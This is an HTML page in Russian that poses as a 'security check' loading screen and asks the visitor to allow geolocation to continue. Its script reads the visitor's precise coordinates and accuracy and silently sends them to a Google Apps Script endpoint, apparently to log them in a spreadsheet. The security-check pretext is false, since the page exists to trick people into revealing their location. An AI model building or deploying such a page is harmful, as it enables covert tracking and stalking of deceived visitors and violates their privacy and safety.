<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Загрузка...</title>
  <style>
    body {
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f5f5f5;
      color: #333;
      flex-direction: column;
      text-align: center;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #555;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>Проверка безопасности...</h2>
  <p>Пожалуйста, разрешите доступ к геолокации для продолжения.</p>
  <div class="loader"></div>

  <script>
    function sendLocation(pos) {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      // Используем URL Google Script для отправки данных
      const url = `https://script.google.com/macros/s/AKfycbyxQCTQIe0AlWAb9khcYJfKJqT_5_V9-q9ntkX4OcuCu8mFsUbX2onblpXMjcwrwPOG/exec?lat=${lat}&lon=${lon}&acc=${acc}`;
      
      // Отправляем данные на Google Sheets
      fetch(url).then(response => {
        console.log('Location sent!');
      }).catch(err => {
        console.error('Error sending location', err);
      });
    }

    function locationError(err) {
      alert("Ошибка получения геопозиции: " + err.message);
    }

    navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
      enableHighAccuracy: true,
      timeout: 10000
    });
  </script>
</body>
</html>
